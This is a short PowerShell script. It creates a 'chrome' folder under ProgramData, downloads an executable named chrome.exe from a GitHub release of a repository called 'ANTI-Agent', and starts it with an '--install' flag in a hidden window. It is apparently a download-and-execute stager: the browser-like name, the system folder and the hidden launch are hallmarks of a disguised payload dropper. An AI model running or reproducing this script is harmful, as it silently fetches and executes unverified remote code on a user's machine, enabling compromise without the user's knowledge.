$d = "$env:ProgramData\chrome"
New-Item -ItemType Directory -Path $d -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri "https://github.com/AdamZoda/ANTI-Agent/releases/download/v1.0.0/chrome.exe" -OutFile "$d\chrome.exe"
Start-Process "$d\chrome.exe" "--install" -WindowStyle Hidden
